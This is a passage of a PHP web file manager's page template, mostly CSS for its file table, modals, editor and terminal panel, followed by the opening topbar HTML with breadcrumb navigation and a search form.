.sb-flink span{overflow:hidden;text-overflow:ellipsis;white-space:nowrap;flex:1}
.sb-flink:hover{background:var(--hov);color:var(--t1);transform:translateX(2px)}.sb-flink:active{transform:scale(.97)}
.sb-empty{font-size:11.5px;color:var(--t3);padding:8px 10px;font-style:italic}
.sb-fav-row{display:flex;align-items:center;gap:2px}
.sb-fav-del{background:none;border:none;color:var(--t3);cursor:pointer;padding:4px;border-radius:6px;display:flex;flex-shrink:0;transition:color .15s,background .15s}
.sb-fav-del:hover{color:#fca5a5;background:rgba(239,68,68,.1)}.sb-fav-del svg{width:11px;height:11px;stroke:currentColor;fill:none;stroke-width:2}
.sb-footer{padding:8px;flex-shrink:0;border-top:1px solid var(--border)}
.disk-w{padding:4px 2px 2px}
.disk-lbl{display:flex;justify-content:space-between;font-size:10px;color:var(--t3);margin-bottom:5px;font-family:'JetBrains Mono',monospace}
.disk-tr{height:5px;background:var(--raised);border-radius:5px;overflow:hidden}
.disk-fi{height:100%;background:linear-gradient(90deg,var(--indigo2),var(--indigo));border-radius:5px;transition:width .4s var(--out)}
.disk-fi.warn{background:linear-gradient(90deg,#d97706,var(--amber))}.disk-fi.crit{background:linear-gradient(90deg,#b91c1c,var(--red))}

/* ══ MAIN ══ */
.main{grid-area:main;display:flex;flex-direction:column;overflow:hidden;min-width:0;position:relative}
.toolbar{padding:8px 12px;border-bottom:1px solid var(--border);background:var(--panel);display:flex;flex-wrap:wrap;gap:6px;align-items:center;flex-shrink:0}
.content{flex:1;overflow-y:auto;padding:12px;position:relative}
.content::-webkit-scrollbar{width:4px}.content::-webkit-scrollbar-thumb{background:rgba(255,255,255,.07);border-radius:6px}
.content.drag-over::after{content:'Drop files to upload';position:absolute;inset:8px;border:2px dashed var(--indigo);border-radius:var(--rlg);background:rgba(99,102,241,.07);display:flex;align-items:center;justify-content:center;font-size:16px;font-weight:600;color:var(--link);pointer-events:none;z-index:50}

/* ══ ALERTS ══ */
.alerts{display:flex;flex-direction:column;gap:6px;margin-bottom:10px}
.alert{display:flex;align-items:center;gap:9px;padding:9px 12px;border-radius:var(--r);font-size:13px;border:1px solid transparent;animation:alertIn .3s var(--spring) both}
@keyframes alertIn{from{opacity:0;transform:translateY(-8px) scale(.97)}to{opacity:1;transform:none}}
.alert svg{width:14px;height:14px;stroke:currentColor;fill:none;stroke-width:2;stroke-linecap:round;flex-shrink:0}
.alert.success{background:rgba(34,197,94,.07);border-color:rgba(34,197,94,.2);color:#86efac}
.alert.danger{background:rgba(239,68,68,.07);border-color:rgba(239,68,68,.2);color:#fca5a5}
.alert.warning{background:rgba(245,158,11,.07);border-color:rgba(245,158,11,.2);color:#fcd34d}
.alert-x{margin-left:auto;background:none;border:none;cursor:pointer;color:inherit;opacity:.5;padding:2px;border-radius:4px;display:flex;transition:opacity .15s,transform .15s var(--spring)}
.alert-x:hover{opacity:1;transform:scale(1.15)}.alert-x svg{width:13px;height:13px;stroke:currentColor;fill:none;stroke-width:2}

/* ══ FILE TABLE ══ */
.card{background:var(--surf);border:1px solid var(--border);border-radius:var(--rlg);overflow:hidden}
.tw{overflow-x:auto}
.ft{width:100%;border-collapse:collapse}
.ft thead tr{background:var(--raised);border-bottom:1px solid var(--border)}
.ft th{padding:8px 12px;font-size:10px;font-weight:700;text-transform:uppercase;letter-spacing:.7px;color:var(--t3);text-align:left;white-space:nowrap;user-select:none}
.ft th a{color:inherit;text-decoration:none;display:inline-flex;align-items:center;gap:3px;transition:color .15s}
.ft th a:hover{color:var(--t2)}.sa a{color:var(--link)!important}.sa .arr{color:var(--link)}
.arr{opacity:.5;font-size:9px}
.ft tbody tr{border-bottom:1px solid var(--border);transition:background .12s;animation:rIn .25s var(--spring) both}
.ft tbody tr:last-child{border-bottom:none}.ft tbody tr:hover{background:var(--hov)}.ft tbody tr.selected{background:rgba(99,102,241,.09)}
.ft tbody tr:focus{outline:2px solid rgba(99,102,241,.5);outline-offset:-2px}
<?php for($i=1;$i<=60;$i++) echo ".ft tbody tr:nth-child($i){animation-delay:".($i*.018)."s}\n";?>
@keyframes rIn{from{opacity:0;transform:translateY(6px)}to{opacity:1;transform:none}}
.ft td{padding:8px 12px;vertical-align:middle}
/* ══ GLOBAL INPUTS DARK THEME ══ */
input[type=checkbox],input[type=radio]{
  appearance:none;-webkit-appearance:none;cursor:pointer;
  width:15px;height:15px;
  background:rgba(0,0,0,.5);
  border:1.5px solid rgba(255,255,255,.18);
  border-radius:4px;
  display:inline-flex;align-items:center;justify-content:center;
  flex-shrink:0;position:relative;
  transition:background .15s,border-color .15s,box-shadow .15s;
  vertical-align:middle;
}
input[type=radio]{border-radius:50%}
input[type=checkbox]:hover,input[type=radio]:hover{border-color:rgba(255,255,255,.35);background:rgba(255,255,255,.05)}
input[type=checkbox]:checked,input[type=radio]:checked{background:var(--indigo);border-color:var(--indigo);box-shadow:0 0 0 3px rgba(99,102,241,.18)}
input[type=checkbox]:checked::after{content:'';position:absolute;left:3px;top:.5px;width:5px;height:8px;border:solid #fff;border-width:0 2px 2px 0;transform:rotate(45deg)}
input[type=radio]:checked::after{content:'';position:absolute;width:6px;height:6px;background:#fff;border-radius:50%;top:50%;left:50%;transform:translate(-50%,-50%)}
input[type=checkbox]:focus,input[type=radio]:focus{outline:none;box-shadow:0 0 0 3px rgba(99,102,241,.25)}
.cc{width:32px}.rck{width:15px;height:15px;cursor:pointer;appearance:none;-webkit-appearance:none;background:rgba(0,0,0,.5);border:1.5px solid rgba(255,255,255,.15);border-radius:4px;display:inline-block;position:relative;flex-shrink:0;transition:background .15s,border-color .15s}
.rck:hover{border-color:rgba(255,255,255,.3)}.rck:checked{background:var(--indigo);border-color:var(--indigo)}
.rck:checked::after{content:'';position:absolute;left:3px;top:.5px;width:5px;height:8px;border:solid #fff;border-width:0 2px 2px 0;transform:rotate(45deg)}
.nc{display:flex;align-items:center;gap:10px;cursor:pointer;min-width:0}
.ib{width:34px;height:34px;flex-shrink:0;border-radius:9px;display:flex;align-items:center;justify-content:center;transition:transform .18s var(--spring)}
.ft tbody tr:hover .ib{transform:scale(1.08)}.ib .ti{width:20px;height:20px}
.nm{min-width:0}
.nt{color:var(--t1);font-weight:500;font-size:13px;display:block;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;max-width:240px;text-decoration:none;transition:color .15s}
a.nt:hover{color:var(--link)}
.eb{display:inline-block;margin-top:1px;font-family:'JetBrains Mono',monospace;font-size:9px;font-weight:700;letter-spacing:.4px;text-transform:uppercase;padding:1px 5px;border-radius:4px;background:var(--raised);color:var(--t3)}
.mono{font-family:'JetBrains Mono',monospace;font-size:11.5px;color:var(--t2);padding:2px 7px;border-radius:5px;background:var(--raised);white-space:nowrap}
.sz{font-family:'JetBrains Mono',monospace;font-size:11.5px;color:var(--t2);white-space:nowrap}
.mt{font-family:'JetBrains Mono',monospace;font-size:10.5px;color:var(--t3);white-space:nowrap}
.acts{display:flex;gap:3px;justify-content:flex-end}

/* ══ GRID VIEW ══ */
.gv{display:grid;grid-template-columns:repeat(auto-fill,minmax(130px,1fr));gap:8px;padding:2px}
.gi{background:var(--surf);border:1px solid var(--border);border-radius:var(--rlg);padding:12px 10px 10px;display:flex;flex-direction:column;align-items:center;gap:6px;cursor:pointer;transition:background .15s,border-color .15s,transform .18s var(--spring);position:relative;animation:rIn .25s var(--spring) both}
.gi:hover{background:var(--hov);border-color:var(--border2);transform:translateY(-2px)}.gi:active{transform:scale(.97)}
.gi.selected{border-color:var(--indigo);background:rgba(99,102,241,.07)}
.gi-ic{width:48px;height:48px;border-radius:11px;display:flex;align-items:center;justify-content:center;flex-shrink:0}
.gi-ic .ti{width:28px;height:28px}.gi-th{width:48px;height:48px;border-radius:9px;object-fit:cover;display:block}
.gi-n{font-size:11.5px;font-weight:500;color:var(--t1);text-align:center;word-break:break-word;max-width:110px;overflow:hidden;display:-webkit-box;-webkit-line-clamp:2;-webkit-box-orient:vertical}
.gi-m{font-size:10px;color:var(--t3);font-family:'JetBrains Mono',monospace}
.gi-ck{position:absolute;top:6px;left:6px;opacity:0;transition:opacity .15s}
.gi:hover .gi-ck,.gi.selected .gi-ck{opacity:1}

/* ══ FILTER BAR ══ */
.filter-bar{display:flex;align-items:center;gap:5px;padding:0 0 8px;flex-wrap:nowrap;overflow-x:auto;-webkit-overflow-scrolling:touch}
.filter-bar::-webkit-scrollbar{display:none}
.fb-btn{display:inline-flex;align-items:center;gap:4px;padding:4px 10px;border-radius:20px;font-size:11.5px;font-weight:600;border:1px solid var(--border);background:transparent;color:var(--t2);cursor:pointer;white-space:nowrap;transition:all .15s;-webkit-user-select:none;user-select:none}
.fb-btn:hover{background:var(--hov);color:var(--t1);border-color:var(--border2)}.fb-btn.active{background:rgba(99,102,241,.12);color:var(--link);border-color:rgba(99,102,241,.3)}

/* ══ BULK BAR ══ */
.bulk-bar{position:absolute;left:50%;bottom:14px;transform:translate(-50%,130%);background:var(--raised);border:1px solid var(--border2);border-radius:13px;padding:7px 9px;display:flex;align-items:center;gap:6px;box-shadow:0 16px 48px rgba(0,0,0,.6);transition:transform .28s var(--spring);z-index:80}
.bulk-bar.show{transform:translate(-50%,0)}.bkc{font-size:12px;color:var(--t1);font-weight:700;padding:0 5px;white-space:nowrap}

/* ══ STATUS BAR ══ */
.bar{grid-area:bar;background:linear-gradient(90deg,var(--indigo2),#6366f1);display:flex;align-items:center;padding:0 12px;gap:16px;overflow:hidden}
.bs{display:flex;align-items:center;gap:4px;font-size:10.5px;font-family:'JetBrains Mono',monospace;color:rgba(255,255,255,.7);white-space:nowrap}
.bs svg{width:11px;height:11px;stroke:rgba(255,255,255,.8);fill:none;stroke-width:2;stroke-linecap:round}.bs strong{color:#fff;font-weight:700}
.bs-click{cursor:pointer;transition:opacity .15s}.bs-click:hover{opacity:.72;text-decoration:underline}
.br{margin-left:auto;display:flex;gap:16px;align-items:center}

/* ══ BUTTONS ══ */
.btn{display:inline-flex;align-items:center;gap:5px;padding:7px 13px;border-radius:var(--r);font-family:'Inter',system-ui,sans-serif;font-size:12.5px;font-weight:600;border:none;cursor:pointer;text-decoration:none;white-space:nowrap;line-height:1;transition:background .15s,transform .18s var(--spring),box-shadow .15s;-webkit-user-select:none;user-select:none}
.btn svg{width:13px;height:13px;stroke:currentColor;fill:none;stroke-width:2;stroke-linecap:round;stroke-linejoin:round;flex-shrink:0}.btn:active{transform:scale(.93)!important}
.btn-sm{padding:5px 11px;font-size:12px;border-radius:8px}.btn-sm svg{width:12px;height:12px}
.btn-icon{padding:6px;border-radius:8px}.btn-icon svg{width:14px;height:14px}
.btn-xs{padding:4px 8px;font-size:11.5px;border-radius:7px;gap:3px}.btn-xs svg{width:12px;height:12px}
.btn-p{background:var(--indigo);color:#fff;box-shadow:0 2px 8px rgba(99,102,241,.3)}.btn-p:hover{background:#7c3aed;transform:translateY(-1px);box-shadow:0 5px 16px rgba(124,58,237,.4)}
.btn-g{background:transparent;color:var(--t2);border:1px solid var(--border)}.btn-g:hover{background:var(--hov);color:var(--t1);border-color:var(--border2);transform:translateY(-1px)}
.btn-green{background:rgba(34,197,94,.1);color:#86efac;border:1px solid rgba(34,197,94,.2)}.btn-green:hover{background:rgba(34,197,94,.17);transform:translateY(-1px)}
.btn-amb{background:rgba(245,158,11,.1);color:#fcd34d;border:1px solid rgba(245,158,11,.2)}.btn-amb:hover{background:rgba(245,158,11,.17);transform:translateY(-1px)}
.btn-red{background:rgba(239,68,68,.1);color:#fca5a5;border:1px solid rgba(239,68,68,.18)}.btn-red:hover{background:rgba(239,68,68,.17);transform:translateY(-1px)}
.btn-blue{background:rgba(59,130,246,.1);color:#93c5fd;border:1px solid rgba(59,130,246,.2)}.btn-blue:hover{background:rgba(59,130,246,.17);transform:translateY(-1px)}
.btn-purp{background:rgba(139,92,246,.1);color:#c4b5fd;border:1px solid rgba(139,92,246,.2)}.btn-purp:hover{background:rgba(139,92,246,.17);transform:translateY(-1px)}
.btn-star{background:rgba(245,158,11,.12);color:#fcd34d;border:1px solid rgba(245,158,11,.25)}.btn-star:hover{background:rgba(245,158,11,.2);transform:translateY(-1px)}

/* ══ INPUTS ══ */
.inp{background:rgba(0,0,0,.4);border:1px solid var(--border);color:var(--t1);border-radius:var(--r);padding:7px 11px;font-size:12.5px;font-family:'Inter',system-ui,sans-serif;outline:none;min-width:0;transition:border-color .18s,box-shadow .18s}
.inp::placeholder{color:var(--t3)}.inp:focus{border-color:rgba(99,102,241,.55);box-shadow:0 0 0 3px rgba(99,102,241,.1)}
.upl-lbl{display:inline-flex;align-items:center;gap:6px;padding:7px 13px;border-radius:var(--r);font-size:12.5px;font-weight:600;font-family:'Inter',sans-serif;cursor:pointer;white-space:nowrap;border:1.5px dashed rgba(99,102,241,.3);color:var(--t2);background:rgba(99,102,241,.04);transition:border-color .18s,color .18s,background .18s,transform .18s var(--spring)}
.upl-lbl svg{width:13px;height:13px;stroke:currentColor;fill:none;stroke-width:2;stroke-linecap:round}
.upl-lbl:hover{border-color:var(--indigo);color:var(--link);background:rgba(99,102,241,.08);transform:translateY(-1px)}.upl-lbl:active{transform:scale(.97)}
input[type=file]{display:none}

/* ══ OVERLAY / MODAL ══ */
.ov{display:none;position:fixed;inset:0;background:rgba(0,0,0,.75);backdrop-filter:blur(8px);z-index:150;opacity:0;transition:opacity .25s}
.ov.vis{opacity:1}
.mod-ov{display:none;position:fixed;inset:0;z-index:300;background:rgba(0,0,0,.8);backdrop-filter:blur(10px);align-items:center;justify-content:center;padding:20px}
.mod-ov.open{display:flex}
.mod{background:var(--surf);border:1px solid var(--border2);border-radius:var(--rlg);display:flex;flex-direction:column;overflow:hidden;animation:fadeUp .3s var(--spring) both;max-height:92vh}
.mod-sm{width:min(480px,95vw)}.mod-md{width:min(680px,95vw)}.mod-lg{width:min(860px,96vw)}
.perm-t{border-collapse:collapse;font-size:12.5px}.perm-t th{text-align:center;color:var(--t3);font-weight:600;font-size:10.5px;text-transform:uppercase;letter-spacing:.5px;padding:4px 8px}.perm-t td{text-align:center;padding:6px 8px;color:var(--t2)}.perm-t td:first-child{text-align:left;font-weight:600;color:var(--t1)}.perm-t input[type=checkbox]{width:16px;height:16px;cursor:pointer}
@keyframes fadeUp{from{opacity:0;transform:translateY(14px)}to{opacity:1;transform:none}}
.mod-head{display:flex;align-items:center;gap:10px;padding:12px 16px;border-bottom:1px solid var(--border);background:var(--raised);flex-shrink:0}
.mod-icon{width:26px;height:26px;border-radius:7px;display:flex;align-items:center;justify-content:center;background:rgba(99,102,241,.15);flex-shrink:0}
.mod-icon svg{width:14px;height:14px;stroke:var(--link);fill:none;stroke-width:2;stroke-linecap:round}
.mod-title{font-size:13px;font-weight:700;color:var(--t1);flex:1;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
.mod-body{overflow:auto;flex:1;padding:16px}
.mod-body::-webkit-scrollbar{width:4px}.mod-body::-webkit-scrollbar-thumb{background:rgba(255,255,255,.08);border-radius:6px}

/* ══ PREVIEW ══ */
.prev-ov{display:none;position:fixed;inset:0;z-index:300;background:rgba(0,0,0,.85);backdrop-filter:blur(10px);align-items:center;justify-content:center;padding:20px}
.prev-ov.open{display:flex}
.prev-box{background:var(--surf);border:1px solid var(--border2);border-radius:var(--rlg);max-width:min(920px,94vw);max-height:92vh;display:flex;flex-direction:column;overflow:hidden;animation:fadeUp .3s var(--spring) both}
.prev-head{display:flex;align-items:center;gap:10px;padding:11px 14px;border-bottom:1px solid var(--border);background:var(--raised)}
.prev-head span{font-size:13px;font-weight:600;color:var(--t1);flex:1;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
.prev-body{overflow:auto;display:flex;align-items:center;justify-content:center;background:#000;min-height:200px}
.prev-body img{max-width:100%;max-height:80vh;display:block}
.prev-body video{max-width:100%;max-height:80vh}
.prev-body iframe{width:min(870px,90vw);height:77vh;border:none;background:#fff}
.prev-body pre{width:min(870px,90vw);max-height:77vh;overflow:auto;padding:18px;font-family:'JetBrains Mono',monospace;font-size:12.5px;color:#cdd6f4;background:#07090e;text-align:left;white-space:pre-wrap;word-break:break-word}

/* ══ CONTEXT MENU (desktop right-click) ══ */
.ctx{display:none;position:fixed;z-index:500;background:var(--raised);border:1px solid var(--border2);border-radius:var(--rlg);padding:5px;min-width:180px;box-shadow:0 20px 60px rgba(0,0,0,.7),0 4px 16px rgba(0,0,0,.4);animation:ctxIn .18s var(--spring) both}
.ctx.open{display:block}
@keyframes ctxIn{from{opacity:0;transform:scale(.93)}to{opacity:1;transform:none}}
.ctx-item{display:flex;align-items:center;gap:9px;padding:8px 12px;border-radius:8px;color:var(--t2);font-size:12.5px;font-weight:500;cursor:pointer;transition:background .12s,color .12s;white-space:nowrap;user-select:none}
.ctx-item svg{width:14px;height:14px;stroke:currentColor;fill:none;stroke-width:2;stroke-linecap:round;flex-shrink:0}
.ctx-item:hover{background:var(--hov);color:var(--t1)}.ctx-item.danger:hover{background:rgba(239,68,68,.1);color:#fca5a5}.ctx-item.ctx-disabled{opacity:.4;pointer-events:none}
.ctx-sep{height:1px;background:var(--border);margin:4px 0}
.ctx-header{padding:6px 12px 4px;font-size:10.5px;font-weight:700;color:var(--t3);text-transform:uppercase;letter-spacing:.6px;display:flex;align-items:center;gap:7px;overflow:hidden;max-width:220px}
.ctx-header span{overflow:hidden;text-overflow:ellipsis;white-space:nowrap}

/* ══ MOBILE BOTTOM SHEET ══ */
.sheet-ov{display:none;position:fixed;inset:0;z-index:400;background:rgba(0,0,0,.7);backdrop-filter:blur(8px)}
.sheet-ov.open{display:block}
.sheet{position:fixed;bottom:0;left:0;right:0;background:var(--panel);border-top:1px solid var(--border2);border-radius:20px 20px 0 0;padding:0 0 max(env(safe-area-inset-bottom),16px);z-index:401;transform:translateY(100%);transition:transform .35s var(--spring);max-height:85dvh;overflow-y:auto}
.sheet.open{transform:translateY(0)}
.sheet-handle{width:36px;height:4px;background:rgba(255,255,255,.15);border-radius:4px;margin:12px auto 16px}
.sheet-info{padding:0 16px 14px;border-bottom:1px solid var(--border)}
.sheet-name{font-size:14px;font-weight:700;color:var(--t1);overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
.sheet-meta{font-size:11.5px;color:var(--t2);margin-top:3px;font-family:'JetBrains Mono',monospace}
.sheet-grid{display:grid;grid-template-columns:1fr 1fr;gap:8px;padding:12px 12px 0}
.sh-btn{display:flex;flex-direction:column;align-items:center;gap:8px;padding:14px 10px;background:var(--raised);border:1px solid var(--border);border-radius:var(--rlg);cursor:pointer;font-size:12.5px;font-weight:600;color:var(--t2);transition:background .15s,color .15s,transform .18s var(--spring);-webkit-user-select:none;user-select:none}
.sh-btn svg{width:22px;height:22px;stroke:currentColor;fill:none;stroke-width:1.7;stroke-linecap:round}
.sh-btn:active{transform:scale(.95)}
.sh-btn:hover{background:var(--hov);color:var(--t1)}.sh-btn.sh-red:hover{background:rgba(239,68,68,.08);color:#fca5a5;border-color:rgba(239,68,68,.2)}
.sh-btn.sh-blue:hover{background:rgba(59,130,246,.08);color:#93c5fd;border-color:rgba(59,130,246,.2)}
.sh-btn.sh-green:hover{background:rgba(34,197,94,.08);color:#86efac;border-color:rgba(34,197,94,.2)}
.sh-btn.sh-amb:hover{background:rgba(245,158,11,.08);color:#fcd34d;border-color:rgba(245,158,11,.2)}
.sh-btn.sh-purp:hover{background:rgba(139,92,246,.08);color:#c4b5fd;border-color:rgba(139,92,246,.2)}

/* ══ TERMINAL (real xterm style) ══ */
.term-win{background:#0c0c0c;border-radius:var(--rlg);overflow:hidden;display:flex;flex-direction:column;height:460px;box-shadow:0 0 0 1px rgba(255,255,255,.08)}
.term-titlebar{display:flex;align-items:center;padding:10px 14px;background:#1a1a1a;border-bottom:1px solid #2a2a2a;gap:8px;flex-shrink:0}
.term-dots{display:flex;gap:6px}
.term-dot{width:12px;height:12px;border-radius:50%}
.term-dot.r{background:#ff5f57}.term-dot.y{background:#febc2e}.term-dot.g{background:#28c840}
.term-title{flex:1;text-align:center;font-family:'JetBrains Mono',monospace;font-size:11px;color:#666;user-select:none}
.term-out{flex:1;overflow-y:auto;padding:12px 16px;font-family:'JetBrains Mono',monospace;font-size:12.5px;line-height:1.75;color:#cccccc;background:#0c0c0c;white-space:pre-wrap;word-break:break-word}
.term-out::-webkit-scrollbar{width:4px}.term-out::-webkit-scrollbar-thumb{background:#333;border-radius:4px}
.term-line{display:block}
.term-line.cmd-line{color:#8be9fd}
.term-line.ok-line{color:#cccccc}
.term-line.err-line{color:#ff5555}
.term-line.info-line{color:#6272a4;font-style:italic}
.term-line.success-line{color:#50fa7b}
.term-prompt-str{color:#50fa7b}
.term-at{color:#bd93f9}
.term-path{color:#8be9fd}
.term-dollar{color:#f8f8f2}
.term-row{display:flex;align-items:center;padding:8px 14px;background:#111;border-top:1px solid #222;gap:10px;flex-shrink:0}
.term-ps{font-family:'JetBrains Mono',monospace;font-size:12.5px;white-space:nowrap;flex-shrink:0}
.term-inp{flex:1;background:transparent;border:none;outline:none;font-family:'JetBrains Mono',monospace;font-size:12.5px;color:#f8f8f2;caret-color:#50fa7b}
.term-cursor{display:inline-block;width:7px;height:14px;background:#50fa7b;animation:blink 1s step-end infinite;vertical-align:text-bottom;margin-left:1px}
@keyframes blink{0%,100%{opacity:1}50%{opacity:0}}
.term-suggest{position:absolute;background:#1e1e2e;border:1px solid #313244;border-radius:6px;padding:4px 0;z-index:9;min-width:180px;box-shadow:0 8px 24px rgba(0,0,0,.6)}
.term-sug-item{padding:5px 12px;font-family:'JetBrains Mono',monospace;font-size:12px;color:#cdd6f4;cursor:pointer;transition:background .1s}
.term-sug-item:hover,.term-sug-item.active{background:#313244}

/* ══ EDITOR ══ */
.ed-card{background:var(--surf);border:1px solid var(--border);border-radius:var(--rlg);overflow:hidden;animation:fadeUp .3s var(--spring) both}
.ed-head{display:flex;align-items:center;flex-wrap:wrap;gap:8px;padding:10px 14px;background:var(--raised);border-bottom:1px solid var(--border)}
.ed-fname{display:flex;align-items:center;gap:7px;font-family:'JetBrains Mono',monospace;font-size:12.5px;font-weight:600;color:var(--t1)}
.ed-fname svg{width:14px;height:14px;stroke:var(--indigo);fill:none;stroke-width:2;stroke-linecap:round}
.ed-meta{font-size:11px;color:var(--t3);font-family:'JetBrains Mono',monospace;margin-left:auto}
textarea.code{display:block;width:100%;min-height:520px;background:#070a10;color:#cdd6f4;border:none;padding:18px 20px;font-family:'JetBrains Mono',monospace;font-size:13px;line-height:1.85;resize:vertical;outline:none;tab-size:4;transition:box-shadow .2s}
textarea.code:focus{box-shadow:inset 0 0 0 1.5px rgba(99,102,241,.45)}
.ed-foot{padding:9px 14px;background:var(--raised);border-top:1px solid var(--border);display:flex;align-items:center;justify-content:space-between;flex-wrap:wrap;gap:6px}
.ed-hint{font-size:11px;color:var(--t3);font-family:'JetBrains Mono',monospace}
kbd{background:var(--surf);border:1px solid var(--border);border-radius:4px;padding:1px 5px;font-size:10px;font-family:'JetBrains Mono',monospace;color:var(--t2)}

/* ══ HASH / INFO / LOG ══ */
.hash-r{display:flex;flex-direction:column;gap:3px;margin-bottom:10px;padding:11px;background:var(--raised);border-radius:var(--r);border:1px solid var(--border)}
.hash-l{font-size:9.5px;font-weight:700;text-transform:uppercase;letter-spacing:.7px;color:var(--t3)}
.hash-v{font-family:'JetBrains Mono',monospace;font-size:12px;color:var(--link);word-break:break-all;cursor:pointer;transition:color .15s}
.hash-v:hover{color:#a5b4fc}
.info-g{display:grid;grid-template-columns:1fr 1fr;gap:8px;margin-bottom:14px}
.info-c{background:var(--raised);border:1px solid var(--border);border-radius:var(--r);padding:12px}
.info-cl{font-size:9.5px;font-weight:700;text-transform:uppercase;letter-spacing:.7px;color:var(--t3);margin-bottom:4px}
.info-cv{font-family:'JetBrains Mono',monospace;font-size:13.5px;font-weight:700;color:var(--t1)}
.info-cs{font-size:10.5px;color:var(--t2);margin-top:2px}
.ext-wrap{display:flex;flex-wrap:wrap;gap:4px;margin-top:8px}
.ext-tag{background:var(--raised);border:1px solid var(--border);border-radius:5px;padding:2px 7px;font-size:10.5px;font-family:'JetBrains Mono',monospace;color:var(--t2)}
.log-t{width:100%;border-collapse:collapse}
.log-t th{text-align:left;font-size:9.5px;font-weight:700;text-transform:uppercase;letter-spacing:.6px;color:var(--t3);padding:7px 10px;border-bottom:1px solid var(--border)}
.log-t td{padding:8px 10px;border-bottom:1px solid rgba(255,255,255,.03);font-size:12px;vertical-align:middle}
.log-t tr:last-child td{border-bottom:none}.log-t tbody tr:hover td{background:var(--hov)}
.la{display:inline-block;padding:2px 7px;border-radius:5px;font-size:10px;font-weight:700;font-family:'JetBrains Mono',monospace;text-transform:uppercase;letter-spacing:.4px}
.la.upload,.la.create{background:rgba(34,197,94,.1);color:#86efac}.la.trash,.la.bulk_delete{background:rgba(239,68,68,.1);color:#fca5a5}
.la.rename,.la.duplicate,.la.batch_rename{background:rgba(245,158,11,.1);color:#fcd34d}.la.edit,.la.mkdir{background:rgba(99,102,241,.1);color:#a5b4fc}
.la.terminal{background:rgba(139,92,246,.1);color:#c4b5fd}.la.restore,.la.zip_extract,.la.tar_extract{background:rgba(6,182,212,.1);color:#67e8f9}

/* ══ EMPTY ══ */
.empty{text-align:center;padding:56px 20px}
.empty svg{width:44px;height:44px;stroke:var(--t3);fill:none;stroke-width:1.5;stroke-linecap:round;margin:0 auto 12px;display:block}
.empty p{color:var(--t3);font-size:14px;font-weight:500}

/* ══ SCROLLBAR ══ */
::-webkit-scrollbar{width:5px;height:5px}::-webkit-scrollbar-track{background:transparent}::-webkit-scrollbar-thumb{background:rgba(255,255,255,.08);border-radius:6px}::-webkit-scrollbar-thumb:hover{background:rgba(255,255,255,.14)}

/* ══ MENU BTN ══ */
.menu-btn{display:none}

/* ══ RESPONSIVE ══ */
@media(max-width:1100px){
  :root{--sw:220px}
  .nt{max-width:180px}
}
@media(min-width:769px) and (max-width:1100px){
  .bc a{max-width:90px}
  .tsearch input{width:120px}
}
@media(max-width:768px){
  :root{--sw:0px;--th:54px;--bh:28px}
  .shell{grid-template:"tb" var(--th) "main" 1fr "bar" var(--bh) / 1fr}
  .topbar{padding:0 10px;gap:6px}
  .brand{width:auto;flex:0 0 auto}
  .bc{display:none}.menu-btn{display:flex!important;min-width:40px;min-height:40px}
  .tb-right .dv{display:none}
  .tb-right .btn-sm span{display:none}
  .tb-right .btn-icon{min-width:40px;min-height:40px}
  #usersBtn{display:none}
  .tsearch{display:none}
  .sidebar{position:fixed;top:var(--th);left:0;width:min(88vw,300px);height:calc(100dvh - var(--th));z-index:160;transform:translateX(-100%);transition:transform .32s var(--spring);border-right:1px solid var(--border2);box-shadow:16px 0 60px rgba(0,0,0,.8);padding-bottom:env(safe-area-inset-bottom)}
  .sidebar.open{transform:translateX(0)}
  .sb-item{padding:11px 12px;min-height:44px}.sb-flink{padding:9px 12px;min-height:40px}
  .content{padding:10px}
  /* Hide table cols on mobile */
  .col-perms,.col-perms-td,.col-mtime,.col-mtime-td{display:none}
  .ft td,.ft th{padding:11px 10px}
  .nt{max-width:none;flex:1}
  .nc{gap:9px}
  /* Hide table actions, use sheet instead */
  .acts{display:none}
  .bar{padding:0 10px;gap:10px}.bs{font-size:10px}.br{gap:10px}
  .bulk-bar{width:calc(100% - 20px);left:10px;right:10px;transform:translate(0,130%);flex-wrap:wrap;padding:10px;gap:6px}
  .bulk-bar.show{transform:translate(0,0)}.bulk-bar .btn{min-height:40px}
  .mod,.prev-box{max-height:90dvh}
  .info-g{grid-template-columns:1fr}
  textarea.code{min-height:360px}
  .gv{grid-template-columns:repeat(auto-fill,minmax(100px,1fr))}
  .toolbar{padding:8px 10px;gap:6px}
  /* Show 2-col on mobile toolbar */
  .tb-row{display:flex;align-items:center;gap:6px;width:100%}
  .tb-row .upl-lbl{flex:0 0 auto}.tb-row .inp{flex:1;min-height:40px;padding:9px 11px}.tb-row .btn-sm{flex-shrink:0;min-height:40px}
}
@media(max-width:430px){
  :root{--th:50px}
  .brand-name{display:none}
  .ib{width:32px;height:32px;border-radius:8px}.ib .ti{width:18px;height:18px}
  .eb{display:none}
  .col-size,.col-size-td{display:none}
  .bs:nth-child(n+4):not(:last-child){display:none}
  .gv{grid-template-columns:repeat(auto-fill,minmax(85px,1fr))}
}
</style>
</head>
<body>
<div class="shell">

<!-- TOPBAR -->
<header class="topbar">
  <button class="btn btn-icon btn-g menu-btn" id="menuBtn" aria-label="Menu">
    <svg viewBox="0 0 24 24"><line x1="3" y1="6" x2="21" y2="6"/><line x1="3" y1="12" x2="21" y2="12"/><line x1="3" y1="18" x2="21" y2="18"/></svg>
  </button>
  <a href="?dir=<?=urlencode(__DIR__)?>" class="brand">
    <div class="brand-icon"><svg viewBox="0 0 24 24"><path d="M3 7a2 2 0 0 1 2-2h4l2 2h8a2 2 0 0 1 2 2v8a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z" fill="rgba(129,140,248,.15)"/></svg></div>
    <span class="brand-name">File Manager</span>
  </a>
  <div class="dv"></div>
  <nav class="bc" aria-label="Breadcrumb">
    <?php $bcs=$fm->breadcrumbs();$last=count($bcs)-1;foreach($bcs as $i=>$b):?>
    <div class="bc-crumb">
      <?php if($i>0):?><span class="bc-sep">/</span><?php endif;?>
      <a href="?dir=<?=urlencode($b['path'])?>" class="<?=$i===$last?'last':''?>"><?=htmlspecialchars(mb_strimwidth($b['label'],0,18,'…'))?></a>
    </div>
    <?php endforeach;?>
  </nav>
  <form method="get" class="tsearch">
    <input type="hidden" name="dir" value="<?=htmlspecialchars($fm->getCwd())?>">
    <svg viewBox="0 0 24 24"><circle cx="11" cy="11" r="8"/><line x1="21" y1="21" x2="16.65" y2="16.65"/></svg>
